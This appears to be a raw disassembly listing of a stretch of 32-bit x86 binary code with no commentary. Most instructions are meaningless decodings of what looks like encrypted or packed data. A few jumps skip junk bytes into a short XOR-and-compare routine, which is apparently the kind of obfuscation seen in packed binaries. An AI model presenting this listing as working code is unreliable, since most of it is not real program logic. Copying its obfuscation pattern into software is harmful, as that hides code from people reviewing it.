  4167a3:	jecxz  0x416730
  4167a5:	mov    ah,0xba
  4167a7:	clc    
  4167a8:	hlt    
  4167a9:	addr16 cmp eax,0x2ff3a621
  4167af:	mov    ds:0x49bba87a,al
  4167b4:	sbb    DWORD PTR [ecx+0x7e],esp
  4167b7:	or     esi,esi
  4167b9:	adc    cl,BYTE PTR [edx-0x934f851]
  4167bf:	test   al,0x7
  4167c1:	fwait
  4167c2:	cld    
  4167c3:	pop    ds
  4167c4:	and    eax,0xb80b5fec
  4167c9:	lods   al,BYTE PTR ds:[si]
  4167cb:	adc    al,BYTE PTR [edi-0x72]
  4167ce:	and    edi,ebx
  4167d0:	and    ebx,eax
  4167d2:	scas   al,BYTE PTR es:[edi]
  4167d3:	push   0xffffffea
  4167d5:	lahf   
  4167d6:	jae    0x4167a7
  4167d8:	sub    BYTE PTR [esi+eiz*8-0x319ddae6],bl
  4167df:	xor    bh,al
  4167e1:	gs lock int 0xaa
  4167e5:	fcmovnu st,st(1)
  4167e7:	xor    eax,0x17a73689
  4167ec:	les    ebx,FWORD PTR [esi]
  4167ee:	xor    BYTE PTR [ebp+0x27],ah
  4167f1:	mov    ebp,0x6ba214f6
  4167f6:	icebp  
  4167f7:	add    esp,ecx
  4167f9:	cmc    
  4167fa:	mov    edi,DWORD PTR [esi]
  4167fc:	arpl   WORD PTR [ecx-0x7ba74ff],cx
  416802:	jmp    0x41731f
  416807:	jmp    0x416abf
  41680c:	ds rcl esi,1
  41680f:	int3   
  416810:	(bad)  
  416812:	retf   0x7ed1
  416815:	xchg   ebx,eax
  416816:	aam    0x3d
  416818:	outs   dx,BYTE PTR ds:[esi]
  416819:	mov    cl,0xdb
  41681b:	and    eax,0x787f2376
  416820:	xchg   ebp,eax
  416821:	jle    0x41689b
  416823:	js     0x4167b1
  416825:	or     DWORD PTR [esi-0x6a],eax
  416828:	dec    edi
  416829:	inc    edi
  41682a:	push   ebx
  41682b:	mov    ah,0x8c
  41682d:	xchg   edx,eax
  41682e:	push   eax
  41682f:	pop    ss
  416830:	or     al,0x65
  416832:	dec    esp
  416833:	mov    edi,0x9670f3a2
  416838:	es xchg ebp,eax
  41683a:	lock jbe 0x4167d8
  41683d:	mov    ch,BYTE PTR ds:0xe14e9ca9
  416843:	and    BYTE PTR [ebx],dh
  416845:	sub    eax,0x48b44629
  41684a:	sbb    eax,0xe0e6c4d1
  41684f:	dec    ebx
  416850:	xchg   edx,eax
  416851:	jb     0x416842
  416853:	xchg   edi,eax
  416854:	xchg   BYTE PTR [ecx-0x71],bl
  416857:	mov    BYTE PTR [edx],al
  416859:	push   ds
  41685a:	xor    ecx,edi
  41685c:	inc    esp
  41685d:	fld    DWORD PTR [esi]
  41685f:	dec    esp
  416860:	rcr    DWORD PTR [ecx-0x292be8a9],1
  416866:	xchg   ecx,eax
  416867:	mov    ah,0xb5
  416869:	sub    al,0xd9
  41686b:	and    dh,bl
  41686d:	xchg   sp,ax
  41686f:	add    al,0x7e
  416871:	lods   al,BYTE PTR ds:[esi]
  416872:	sar    BYTE PTR [edx+0x645bdb59],1
  416878:	dec    esp
  416879:	outs   dx,DWORD PTR ds:[esi]
  41687a:	push   edi
  41687b:	dec    esp
  41687c:	(bad)  
  41687d:	ds xchg esi,eax
  41687f:	mov    esi,0x3c93b666
  416884:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416885:	fcomi  st,st(3)
  416887:	pop    ebp
  416888:	pop    edi
  416889:	outs   dx,BYTE PTR ds:[esi]
  41688a:	rol    edi,1
  41688c:	outs   dx,BYTE PTR ds:[esi]
  41688d:	retf   
  41688e:	mov    dl,0x42
  416890:	data16 js 0x416816
  416893:	mov    al,0xb7
  416895:	sti    
  416896:	aam    0x75
  416898:	mov    al,ds:0x9544ef70
  41689d:	mov    cl,0xcb
  41689f:	popa   
  4168a0:	sub    dh,bh
  4168a2:	mov    BYTE PTR [edi-0x75392d74],dl
  4168a8:	retf   
  4168a9:	mov    edx,0x89a27922
  4168ae:	add    ebp,edi
  4168b0:	add    DWORD PTR [eax],0xffffffe7
  4168b3:	ins    BYTE PTR es:[edi],dx
  4168b4:	push   esp
  4168b5:	aam    0x6e
  4168b7:	repz scas al,BYTE PTR es:[edi]
  4168b9:	mov    BYTE PTR ds:0xa532c158,dh
  4168bf:	out    dx,eax
  4168c0:	les    esi,FWORD PTR [eiz*2+0x292074dc]
  4168c7:	cmp    DWORD PTR [ebx-0x70733fb4],ebx
  4168cd:	in     eax,dx
  4168ce:	add    ebx,DWORD PTR [edi]
  4168d0:	cs retf 
  4168d2:	(bad)  
  4168d3:	lds    ecx,FWORD PTR [edi]
  4168d5:	fmulp  st(2),st
  4168d7:	in     eax,dx
  4168d8:	lahf   
  4168d9:	ret    
  4168da:	sub    BYTE PTR [ecx+0x5d],bl
  4168dd:	sbb    esi,DWORD PTR [edx-0x6c]
  4168e0:	mov    ds:0xbba70bd9,eax
  4168e5:	in     eax,dx
  4168e6:	xor    eax,0x8b8a3769
  4168eb:	or     BYTE PTR [ebx-0x72],al
  4168ee:	and    ch,ah
  4168f0:	xor    BYTE PTR ds:0xeb44dfc6,al
  4168f6:	push   edx
  4168f7:	mov    esi,0x9346054a
  4168fc:	ins    BYTE PTR es:[edi],dx
  4168fd:	out    dx,eax
  4168fe:	js     0x41696b
  416900:	sbb    al,0x70
  416902:	(bad)  
  416903:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  416905:	addr16 pushf 
  416907:	leave  
  416908:	out    0xc6,al
  41690a:	outs   dx,BYTE PTR ds:[esi]
  41690b:	popf   
  41690c:	leave  
  41690d:	test   eax,0x61cbd6fb
  416912:	push   esi
  416913:	sub    bl,BYTE PTR [eax-0x73f00fa6]
  416919:	sub    DWORD PTR [edx+0x2a],ebx
  41691c:	mov    fs:0x87ca0003,al
  416922:	adc    eax,0x8bbf0fab
  416927:	mov    bl,BYTE PTR [edi]
  416929:	sbb    bh,BYTE PTR [edx+0x71]
  41692c:	xchg   edx,eax
  41692d:	lahf   
  41692e:	test   BYTE PTR ds:[eax],0x32
  416932:	inc    esp
  416933:	mov    al,0x70
  416935:	dec    edx
  416936:	xor    al,al
  416938:	movaps xmm7,XMMWORD PTR [eax+0xc041afb]
  41693f:	in     eax,0x34
  416941:	jbe    0x4168ee
  416943:	mov    edi,0xa15aa19c
  416948:	or     al,0x85
  41694a:	lock mov bl,0x55
  41694d:	mov    ch,0x3f
  41694f:	aaa    
  416950:	jne    0x416998
  416952:	lods   eax,DWORD PTR ds:[esi]
  416953:	test   eax,0x37e3659c
  416958:	retf   0x4ab4
  41695b:	pop    ecx
  41695c:	mov    dl,0xf8
  41695e:	rol    DWORD PTR [edi*4-0x4c6bdfd2],1
  416965:	sbb    ebp,ecx
  416967:	cs stos DWORD PTR es:[edi],eax
  416969:	dec    esi
  41696a:	repz dec esp
  41696c:	adc    DWORD PTR [esi+0x78bd521d],esp
  416972:	enter  0x2435,0xd8
  416976:	int3   
  416977:	pop    ecx
  416978:	or     eax,0x1bc41a6b
  41697d:	xor    dh,cl
  41697f:	cmp    bh,BYTE PTR [ecx+ebx*2+0x7d]
  416983:	out    0x25,eax
  416985:	lods   eax,DWORD PTR ds:[esi]
  416986:	push   edi
  416987:	dec    edx
  416988:	cmp    BYTE PTR [ecx+0x5d],bl
  41698b:	pop    eax
  41698c:	stos   BYTE PTR es:[edi],al
  41698d:	and    ebp,DWORD PTR [edx+0xa]
  416990:	mov    eax,ds:0x6d8ceac8
  416995:	stos   DWORD PTR es:[edi],eax
  416996:	push   cs
  416997:	or     DWORD PTR [edi+0x14],esp
  41699a:	ror    DWORD PTR [edx+ebp*1-0x5f0ab99],cl
  4169a1:	hlt    
  4169a2:	test   al,0xad
  4169a4:	adc    al,0x3c
  4169a6:	aam    0x92
  4169a8:	loope  0x41694e
  4169aa:	cmp    al,0x8a
  4169ac:	test   ah,0x81
  4169af:	xchg   ebp,eax
  4169b0:	add    BYTE PTR [bx+si],ah
  4169b3:	adc    BYTE PTR [ecx+ebp*8],ah
  4169b6:	adc    DWORD PTR [edx+0x4e852b63],ebp
  4169bc:	clc    
  4169bd:	es inc edx
  4169bf:	ror    DWORD PTR [ecx-0x2620701e],1
  4169c5:	jmp    0x416985
  4169c7:	pop    eax
  4169c8:	lods   eax,DWORD PTR ds:[esi]
  4169c9:	and    DWORD PTR [ebx-0x2e859a08],esi
  4169cf:	into   
  4169d0:	inc    ebp
  4169d1:	and    eax,0x8ed5b761
  4169d6:	sub    ebx,esp
  4169d8:	xchg   esp,ebx
  4169da:	and    BYTE PTR [edx-0x10a2580c],ah
  4169e0:	xchg   edx,eax
  4169e1:	je     0x416992
  4169e3:	out    dx,eax
  4169e4:	stc    
  4169e5:	call   0xe5c0d748
  4169ea:	dec    edi
  4169eb:	jmp    0x19ae5edb
  4169f0:	ja     0x4169ee
  4169f2:	jb     0x4169be
  4169f4:	(bad)  
  4169f5:	mov    ebp,0xb5f3be67
  4169fa:	mov    ch,0xb
  4169fc:	cmp    dl,bl
  4169fe:	mov    fs,WORD PTR ds:0x9ca32e9e
  416a04:	or     eax,0x91917daf
  416a09:	push   ds
  416a0a:	loop   0x4169b5
  416a0c:	into   
  416a0d:	out    dx,al
  416a0e:	xchg   ebx,eax
  416a0f:	push   es
  416a10:	push   ds
  416a11:	sbb    al,0xca
  416a13:	xor    bl,BYTE PTR [eax-0x3f]
  416a16:	inc    esp
  416a17:	xchg   BYTE PTR [eax-0x41],al
  416a1a:	or     ch,dh
  416a1c:	icebp  
  416a1d:	mov    bl,0xd1
  416a1f:	jmp    0x416a70
  416a21:	mov    eax,0xa889bf20
  416a26:	aaa    
  416a27:	aas    
  416a28:	out    dx,eax
  416a29:	mov    al,ds:0xdc601840
  416a2e:	ret    
  416a2f:	dec    eax
  416a30:	call   0xe4db2e66
  416a35:	(bad)  
  416a36:	test   esi,0x49350d29
  416a3c:	addr16 mov edi,0x5973afb9
  416a42:	call   0x241486a2
  416a47:	jno    0x416abe
  416a49:	cmp    ah,BYTE PTR [ebx+0x32]
  416a4c:	mov    ss,WORD PTR [ebx]
  416a4e:	test   al,0x8f
  416a50:	jo     0x416a49
  416a52:	int3   
  416a53:	sub    ax,WORD PTR [esi]
  416a56:	xchg   ebx,eax
  416a57:	mov    ah,BYTE PTR [ecx*4-0x38ad61e3]
  416a5e:	xchg   esi,eax
  416a5f:	daa    
  416a60:	mov    ds:0x9ce54f7a,eax
  416a65:	jnp    0x416add
  416a67:	lahf   
  416a68:	(bad)  
  416a6a:	inc    esi
  416a6b:	test   dl,cl
  416a6d:	push   DWORD PTR [edi-0x6d]
  416a70:	cwde   
  416a71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a72:	and    al,0x4e
  416a74:	cld    
  416a75:	rcl    DWORD PTR [esp+esi*2+0x425a16fe],1
  416a7c:	int    0x61
  416a7e:	int    0x11
  416a80:	inc    ecx
  416a81:	push   ss
  416a82:	es mov esp,0x841c4646
  416a88:	mov    BYTE PTR [ecx],dl
  416a8a:	sbb    DWORD PTR [edx+0x25],esp
  416a8d:	pop    esi
  416a8e:	retf   
  416a8f:	mov    dh,0x5c
  416a91:	sbb    BYTE PTR [edi],cl
  416a93:	out    dx,eax
  416a94:	xchg   edx,eax
  416a95:	ud1    ebp,DWORD PTR ds:[edi+edi*1+0x50]
  416a9b:	jecxz  0x416a65
  416a9d:	cmp    edi,ecx
  416a9f:	imul   edi,DWORD PTR [esi+0x57],0xae92630a
  416aa6:	data16 int 0x11
  416aa9:	inc    eax
  416aaa:	mov    WORD PTR [ecx],?
  416aac:	les    esp,FWORD PTR [ebp-0x19]
  416aaf:	test   al,0xad
  416ab1:	mov    ch,BYTE PTR [ebx+0x1c]
  416ab4:	pop    es
  416ab5:	call   0xa73d380f
  416aba:	pop    ebx
  416abb:	mov    ecx,0x8be36b07
  416ac0:	inc    ebp
  416ac1:	cld    
  416ac2:	jmp    0x416d7a
  416ac7:	rol    dl,1
  416ac9:	(bad)  
  416aca:	iret   
  416acb:	fcmovbe st,st(5)
  416acd:	fcmovne st,st(1)
  416acf:	mov    eax,0xc464ff75
  416ad4:	shl    ah,1
  416ad6:	adc    BYTE PTR [ebx-0x6a8780e0],0x7e
  416add:	js     0x416b57
  416adf:	ins    DWORD PTR es:[edi],dx
  416ae0:	fs cdq 
  416ae2:	scas   al,BYTE PTR es:[edi]
  416ae3:	xor    DWORD PTR [eax+edi*1+0x58],esp
  416ae7:	sti    
  416ae8:	jge    0x416a8d
  416aea:	add    ah,ch
  416aec:	jl     0x416ab2
  416aee:	out    0xd0,al
  416af0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416af1:	inc    edi
  416af2:	(bad)  
  416af4:	popf   
  416af5:	add    eax,0x43300e0b
  416afa:	cmp    edx,DWORD PTR [ebp+0x37]
  416afd:	call   0x4bf6:0x591d6eb9
  416b04:	jmp    0x86e1:0x74134965
  416b0b:	push   ebp
  416b0c:	shr    DWORD PTR [edi-0x4d],0x6d
  416b10:	mov    ecx,0x29899552
  416b16:	push   ss
  416b17:	ss jge 0x416b48
  416b1a:	daa    
  416b1b:	arpl   WORD PTR [edx+0x54acd242],ax
  416b21:	leave  
  416b22:	add    cl,BYTE PTR [esi+0x6]
  416b25:	dec    esi
  416b26:	icebp  
  416b27:	fist   WORD PTR gs:[ebx-0x2a]
  416b2b:	push   es
  416b2c:	test   BYTE PTR [edi-0x135bfbda],cl
  416b32:	sbb    eax,0x31c51e52
  416b37:	dec    esp
  416b38:	ja     0x416ae1
  416b3a:	adc    eax,0xf93e2a1e
  416b3f:	mov    fs,ebx
  416b41:	sbb    edx,eax
  416b43:	mov    eax,eax
  416b45:	inc    edi
  416b46:	cmp    ah,BYTE PTR [ecx+0x1062f75c]
  416b4c:	jmp    0x416b5e
  416b4e:	or     eax,0x5e5c2e74
  416b53:	sub    al,0x26
  416b55:	lahf   
  416b56:	push   es
  416b57:	idiv   BYTE PTR [esi-0x15]
  416b5a:	in     eax,dx
  416b5b:	mov    dh,0x57
  416b5d:	test   eax,0xf881b9a
  416b62:	jl     0x416bc2
  416b64:	lds    esp,FWORD PTR [edx+ebx*4+0x63]
  416b68:	pop    esi
  416b69:	jecxz  0x416bb6
  416b6b:	sti    
  416b6c:	mov    eax,ds:0x107e8745
  416b71:	dec    ecx
  416b72:	lea    ebp,ds:0xfa0414b7
  416b78:	mov    esi,0xe55c72c9
  416b7d:	daa    
  416b7e:	dec    ebp
  416b7f:	not    DWORD PTR [ebx+eiz*4]
  416b82:	lods   al,BYTE PTR ds:[esi]
  416b83:	fist   DWORD PTR [ecx+0x1aa2125a]
  416b89:	and    al,0xe6
  416b8b:	xchg   ebp,eax
  416b8c:	inc    esp
  416b8d:	or     eax,0x6855bc19
  416b92:	(bad)  
  416b93:	and    DWORD PTR [edi],ecx
  416b95:	xor    eax,edx
  416b97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b98:	xor    eax,0xa6325e4e
  416b9d:	add    edi,DWORD PTR ds:0x7b6228d1
  416ba3:	lods   al,BYTE PTR ds:[esi]
  416ba4:	ins    DWORD PTR es:[edi],dx
  416ba5:	ja     0x416b80
  416ba7:	inc    ebx
  416ba8:	and    bl,BYTE PTR ds:0x2c1de2a7
  416bae:	dec    eax
  416baf:	xchg   ecx,eax
  416bb0:	and    eax,0x1c98d8d5
  416bb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bb6:	pop    esp
  416bb7:	fdivr  st(0),st
  416bb9:	xor    eax,0xa485bdf6
  416bbe:	mov    ebp,0xc2a9cd6a
  416bc3:	sub    eax,0x977bef7e
  416bc8:	retf   
  416bc9:	popf   
  416bca:	gs test cl,dh
  416bcd:	sar    BYTE PTR [ebp-0x14ec264b],1
  416bd3:	in     al,0x9e
  416bd5:	lock xchg esp,eax
  416bd7:	pop    esi
  416bd8:	mov    DWORD PTR ds:0x1a1d8555,ebx
  416bde:	xor    edi,esi
  416be0:	mov    ebp,edi
  416be2:	inc    ecx
  416be3:	xchg   edx,eax
  416be4:	mov    ebp,0x80eba1bc
  416be9:	and    eax,0xbfb8c9fe
  416bee:	cmc    
  416bef:	nop
  416bf0:	sbb    edi,DWORD PTR [esi-0x49]
  416bf3:	xor    edx,DWORD PTR [edx+0x60]
  416bf6:	or     eax,0x2ecfa6ff
  416bfb:	dec    edi
  416bfc:	loop   0x416c70
  416bfe:	and    ecx,DWORD PTR [ecx+edi*8-0xcfe895]
  416c05:	jnp    0x416bff
  416c07:	xlat   BYTE PTR ds:[ebx]
  416c08:	jp     0x416baf
  416c0a:	push   edi
  416c0b:	cmp    edx,DWORD PTR [ebx+0x1b3fb7e0]
  416c11:	inc    esp
  416c12:	dec    ebp
  416c13:	enter  0x69b,0x5e
  416c17:	or     al,0x8c
  416c19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c1a:	pop    ebp
  416c1b:	pusha  
  416c1c:	les    ebp,FWORD PTR [ebx-0x670e06b0]
  416c22:	adc    eax,0x6c3652e6
  416c27:	shl    BYTE PTR [ebp-0x73],0x8c
  416c2b:	loope  0x416c5b
  416c2d:	push   es
  416c2e:	sar    bh,0xa9
  416c31:	aam    0xa4
  416c33:	aad    0x4c
  416c35:	jno    0x416bc6
  416c37:	jb     0x416c4e
  416c39:	(bad)  
  416c3a:	adc    BYTE PTR [edi],ch
  416c3c:	loope  0x416cb3
  416c3e:	lahf   
  416c3f:	bound  edx,QWORD PTR ds:0x8d50f54a
  416c45:	push   ebp
  416c46:	dec    ebp
  416c47:	aad    0x21
  416c49:	push   ebx
  416c4a:	call   edi
  416c4c:	(bad)  
  416c4d:	in     al,0xa3
  416c4f:	(bad)  
  416c50:	cmp    esp,DWORD PTR [esi]
  416c52:	jbe    0x416c75
  416c54:	mov    edx,0xd2e386de
  416c59:	or     BYTE PTR [ebp-0x7507b09b],dh
  416c5f:	dec    bp
  416c61:	aas    
  416c62:	add    al,0x10
  416c64:	es cli 
  416c66:	jb     0x416cb3
  416c68:	push   esp
  416c69:	xor    DWORD PTR [edx],ecx
  416c6b:	xor    edx,DWORD PTR [edi+0x7a]
  416c6e:	retf   0x5a53
  416c71:	xor    eax,0xbb184472
  416c76:	lds    edi,FWORD PTR [eax-0x56]
  416c79:	push   ecx
  416c7a:	mov    dl,0x27
  416c7c:	addr16 jae 0x416c34
  416c7f:	pop    ds
  416c80:	sahf   
  416c81:	lea    ebp,[eax+0x6d]
  416c84:	aam    0x4c
  416c86:	push   0xb20fe5d0
  416c8b:	push   edx
  416c8c:	pop    ecx
  416c8d:	jmp    0x416c47
  416c8f:	call   0x5389:0x75ae959b
  416c96:	sbb    ch,al
  416c98:	fstp   QWORD PTR [esi]
  416c9a:	jmp    0x15a8e789
  416c9f:	pushf  
  416ca0:	scas   al,BYTE PTR es:[edi]
  416ca1:	mov    eax,0xf988c1f9
  416ca6:	and    al,BYTE PTR [edi]
  416ca8:	pop    ss
  416ca9:	inc    ebx
  416caa:	rol    BYTE PTR [esi+0x2b],cl
  416cad:	xor    edi,DWORD PTR [ebx-0x31]
  416cb0:	aas    
  416cb1:	aas    
  416cb2:	jnp    0x416c49
  416cb4:	(bad)  
  416cb5:	mov    ebx,0x2a5f66d9
  416cba:	cwde   
  416cbb:	sub    al,0xcd
  416cbd:	or     bl,ah
  416cbf:	mov    eax,eax
  416cc1:	cmp    al,0x1e
  416cc3:	jg     0x416d14
  416cc5:	ret    
  416cc6:	ret    0xce1
  416cc9:	dec    esi
  416cca:	xor    bl,BYTE PTR [ecx+0x4c]
  416ccd:	test   DWORD PTR [edi],ebx
  416ccf:	xor    eax,0x5a9b77b1
  416cd4:	mov    ebx,0x897bb850
  416cd9:	add    BYTE PTR [esi+0x424f8164],bl
  416cdf:	inc    ebp
  416ce0:	fidiv  WORD PTR [eax-0x7bf8917b]
  416ce6:	adc    esp,ebp
  416ce8:	sub    BYTE PTR [edi-0x7f],bl
  416ceb:	je     0x416cf9
  416ced:	or     BYTE PTR [eax-0x48],0xd9
  416cf1:	sti    
  416cf2:	fisttp QWORD PTR [edi+0x2c5d0eb1]
  416cf8:	push   ds
  416cf9:	lock pop esp
  416cfb:	fadd   DWORD PTR [esi-0x49]
  416cfe:	xchg   BYTE PTR [ebx+0x4efe7dc],al
  416d04:	imul   esi,edi,0x7b8afd4f
  416d0a:	add    DWORD PTR [ebp-0x76],0x20
  416d0e:	jp     0x416cf5
  416d10:	adc    al,0xee
  416d12:	rsm    
  416d14:	adc    DWORD PTR [eax+0x6b9b70aa],esi
  416d1a:	sub    al,0xb5
  416d1c:	push   cs
  416d1d:	mov    ebp,0x7d2cfb3
  416d22:	dec    eax
  416d23:	imul   ebp,DWORD PTR [eax],0xffffffd2
  416d26:	hlt    
  416d27:	cmp    ecx,DWORD PTR [eax-0x37a98226]
  416d2d:	sub    eax,0x2495280b
  416d32:	pop    ds
  416d33:	mov    ebp,0x911ee5bd
  416d38:	and    al,0x3a
  416d3a:	js     0x416d4d
  416d3c:	cwde   
  416d3d:	test   BYTE PTR [edi-0xe],ah
  416d40:	fst    DWORD PTR [edx]
  416d42:	jge    0x416cfb
  416d44:	or     dl,dh
  416d46:	into   
  416d47:	inc    edi
  416d48:	mov    DWORD PTR [ebx-0x33],edi
  416d4b:	sbb    BYTE PTR [ebx-0x4a40bee7],bh
  416d51:	dec    eax
  416d52:	imul   eax,DWORD PTR [ebx+0x31],0x1
  416d56:	ret    
  416d57:	add    dh,cl
  416d59:	fnstsw WORD PTR [edx-0x157cefca]
  416d5f:	cwde   
  416d60:	dec    ecx
  416d61:	rcr    BYTE PTR [ebp+ecx*4+0x48],1
  416d65:	mov    BYTE PTR [edi-0x36ca903f],bh
  416d6b:	and    al,0x73
  416d6d:	xor    eax,0x11ba932d
  416d72:	mov    WORD PTR [edi+0x46a4232e],?
  416d78:	push   ecx
  416d79:	ret    
  416d7a:	mov    ecx,DWORD PTR [ebp+0x10]
  416d7d:	xor    eax,edi
  416d7f:	add    eax,esi
  416d81:	cmp    eax,ecx
  416d83:	jne    0x41731c
  416d89:	mov    eax,DWORD PTR [ebp-0x4]
  416d8c:	xor    eax,edi
  416d8e:	add    eax,esi
  416d90:	mov    ds:0x41eb6a,eax
  416d95:	mov    eax,DWORD PTR [ebp-0x4]
  416d98:	xor    eax,edi
  416d9a:	jmp    0x417052
  416d9f:	xlat   BYTE PTR ds:[ebx]
  416da0:	cmp    eax,0xd9dac7cc
  416da5:	fcmovne st,st(5)
  416da7:	push   ecx
  416da8:	call   0xf4ca:0x9ff61efb
  416daf:	sub    BYTE PTR ds:0x7e95787f,ah
  416db5:	js     0x416e2f
  416db7:	ins    BYTE PTR es:[edi],dx
  416db8:	or     cl,ch
  416dba:	ret    
  416dbb:	fdivr  DWORD PTR [edi+0x56]
  416dbe:	mov    ebp,0x88e66d80
  416dc3:	push   ebp
  416dc4:	cli    
  416dc5:	ss xor eax,0x3f6e7bcd
  416dcb:	lds    edi,FWORD PTR [edx]
  416dcd:	push   esp
  416dce:	daa    
  416dcf:	ja     0x416d53
  416dd1:	or     BYTE PTR [edi+0x62],0xc4
  416dd5:	mov    cl,0x97
  416dd7:	cli    
  416dd8:	push   eax
  416dd9:	stos   BYTE PTR es:[edi],al
  416dda:	xor    BYTE PTR [ecx+0x67],dh
  416ddd:	mov    ds:0x13055c38,al
  416de2:	int3   
  416de3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416de4:	scas   eax,DWORD PTR es:[edi]
  416de5:	and    eax,0x397a31e
  416dea:	je     0x416e0d
  416dec:	push   ss
  416ded:	gs add al,0x11
  416df0:	(bad)  
  416df1:	fild   WORD PTR [ecx+0x5436d76e]
  416df7:	aad    0x66
  416df9:	push   es
  416dfa:	aaa    
  416dfb:	stos   BYTE PTR es:[edi],al
  416dfc:	not    BYTE PTR ds:0x52f5b72c
  416e02:	add    eax,0x4f19dd1f
  416e07:	push   es
  416e08:	push   es
  416e09:	pop    edx
  416e0a:	lods   eax,DWORD PTR ds:[esi]
  416e0b:	inc    eax
  416e0c:	mov    ecx,0xc77e75ba
  416e11:	mov    ds:0xf3979382,eax
  416e16:	sub    esp,DWORD PTR [eax]
  416e18:	xor    ah,cl
  416e1a:	inc    esi
  416e1b:	(bad)  
  416e1c:	dec    esi
  416e1d:	fld    DWORD PTR [ecx+0x733d4bfe]
  416e23:	and    bl,BYTE PTR [ebx+0x11]
  416e26:	shl    DWORD PTR [edx],cl
  416e28:	push   0x60
  416e2a:	cmp    eax,0xfe0bafc4
  416e2f:	sbb    esp,DWORD PTR [ebx]
  416e31:	mov    BYTE PTR [eax-0x18],cl
  416e34:	fxch   st(3)
  416e36:	adc    DWORD PTR [ecx],ebx
  416e38:	dec    edi
  416e39:	test   BYTE PTR [ebp*8+0x4c4c7a37],bh
  416e40:	inc    ecx
  416e41:	xor    BYTE PTR [ebx-0x24],ah
  416e44:	punpcklbw mm7,DWORD PTR [esi]
  416e47:	sbb    ah,cl
  416e49:	sbb    BYTE PTR [ebx],0xb6
  416e4c:	add    al,0x62
  416e4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e4f:	mov    dl,0x1e
  416e51:	jo     0x416e87
  416e53:	aad    0x46
  416e55:	push   edx
  416e56:	cs push edx
  416e58:	test   BYTE PTR [ecx+0x74626d9b],al
  416e5e:	sbb    edi,DWORD PTR [ebx-0x16]
  416e61:	ftst   
  416e63:	cmp    eax,DWORD PTR [esp+edx*2]
  416e66:	shr    DWORD PTR [edi-0x64],0x9d
  416e6a:	call   0x12df0cdc
  416e6f:	sbb    al,0x0
  416e71:	inc    edx
  416e72:	mov    ds:0x4883c175,eax
  416e77:	je     0x416e16
  416e79:	cmp    edi,DWORD PTR [esi-0x648644de]
  416e7f:	and    ebp,DWORD PTR [edx-0x1364d3dd]
  416e85:	xchg   edi,eax
  416e86:	(bad)  
  416e87:	fwait
  416e88:	mov    eax,ds:0xc8e8c46c
  416e8d:	push   edx
  416e8e:	cwde   
  416e8f:	pushf  
  416e90:	mov    edx,0x4ec37ecf
  416e95:	ret    0x2cdc
  416e98:	es sti 
  416e9a:	fs sbb ebx,0xffffffb9
  416e9e:	mov    ds:0x47bb9e96,eax
  416ea3:	(bad)  [ebp+0x1a]
  416ea6:	sti    
  416ea7:	mov    ch,0xb1
  416ea9:	fdivr  DWORD PTR [eax+0x30]
  416eac:	mov    ds,WORD PTR [edx]
  416eae:	mov    ecx,0x1dae6bef
  416eb3:	push   ebp
  416eb4:	adc    DWORD PTR [ebp+0x27],ebx
  416eb7:	inc    ecx
  416eb8:	dec    ecx
  416eb9:	shl    bl,1
  416ebb:	pop    eax
  416ebc:	(bad)  
  416ebd:	pop    esp
  416ebe:	(bad)  
  416ec0:	pop    esi
  416ec1:	aad    0xf3
  416ec3:	and    bh,BYTE PTR [edi-0x56]
  416ec6:	cmp    BYTE PTR [eax-0x80],0xfc
  416eca:	fs in  eax,dx
  416ecc:	js     0x416eb8
  416ece:	xchg   esi,eax
  416ecf:	data16 div BYTE PTR [ecx]
  416ed2:	push   esp
  416ed3:	xchg   edi,eax
  416ed4:	mov    WORD PTR [ebx+0x77a058ff],es
  416eda:	sub    BYTE PTR [ecx],dl
  416edc:	mov    ch,0x89
  416ede:	data16 jge 0x416f2e
  416ee1:	dec    ebx
  416ee2:	dec    esi
  416ee3:	sub    DWORD PTR [edi+0x60ef2850],0xffffffd1
  416eea:	ds xchg edi,eax
  416eec:	lds    ebp,FWORD PTR [edi-0x6f021cf]
  416ef2:	mov    eax,ds:0xf896da29
  416ef7:	test   BYTE PTR [ebx],ch
  416ef9:	push   esp
  416efa:	mov    esi,0xe256f4fe
  416eff:	or     ch,al
  416f01:	inc    eax
  416f02:	popa   
  416f03:	fbstp  TBYTE PTR [eax+edx*1+0xa]
  416f07:	scas   ax,WORD PTR es:[edi]
  416f09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f0a:	jge    0x416eba
  416f0c:	sahf   
  416f0d:	loop   0x416ecc
  416f0f:	lock stos DWORD PTR es:[edi],eax
  416f11:	jp     0x416eed
  416f13:	js     0x416ee2
  416f15:	add    eax,0x647a1fb
  416f1a:	cdq    
  416f1b:	addr16 popf 
  416f1d:	jl     0x416f6d
  416f1f:	xor    al,0xfd
  416f21:	adc    al,0xb7
  416f23:	mov    bl,0xd5
  416f25:	jge    0x416f7b
  416f27:	call   0x9f223442
  416f2c:	fbstp  TBYTE PTR [edi+0x4]
  416f2f:	jmp    0xa540:0x1968f82e
  416f36:	std    
  416f37:	ret    0xfbf6
  416f3a:	xchg   ecx,eax
  416f3b:	mov    ds:0x93b7025a,eax
  416f40:	adc    eax,0xba61ecdb
  416f45:	xchg   ebx,eax
  416f46:	or     BYTE PTR [ecx-0x5],bl
  416f49:	sub    edx,esi
  416f4b:	adc    al,BYTE PTR [edx]
  416f4d:	fnstenv [esi-0x2f]
  416f50:	sbb    DWORD PTR [eax+0xa],ecx
  416f53:	jecxz  0x416f19
  416f55:	dec    DWORD PTR ds:0x84a88fcf
  416f5b:	inc    ebp
  416f5c:	adc    BYTE PTR [eax-0x40],dl
  416f5f:	jl     0x416f8d
  416f61:	xchg   ebx,eax
  416f62:	jb     0x416f3b
  416f64:	mov    al,ds:0x92ea79f3
  416f69:	inc    ebp
  416f6a:	dec    esi
  416f6b:	test   al,0xec
  416f6d:	daa    
  416f6e:	rol    BYTE PTR [ecx+0x3f8b8b4a],0x26
  416f75:	jecxz  0x416f94
  416f77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f78:	stos   BYTE PTR es:[edi],al
  416f79:	mov    BYTE PTR [eax+0x26],dh
  416f7c:	cli    
